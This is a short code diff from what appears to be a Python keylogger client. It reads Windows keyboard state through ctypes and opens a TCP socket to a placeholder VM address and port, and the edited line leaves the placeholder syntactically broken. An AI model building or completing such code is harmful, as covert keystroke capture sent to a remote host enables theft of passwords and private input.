@@ -3,7 +3,7 @@ import ctypes  # Import ctypes to access Windows API for keyboard state
 import time  # Import time for sleep functionality
 
 # Set the server address and port
-serverAddress = ('put your vms ip', (put your portnumber) )
+serverAddress = ('put your vms ip', put your portnumber) )
 # Create a TCP/IP socket
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Connect the socket to the server
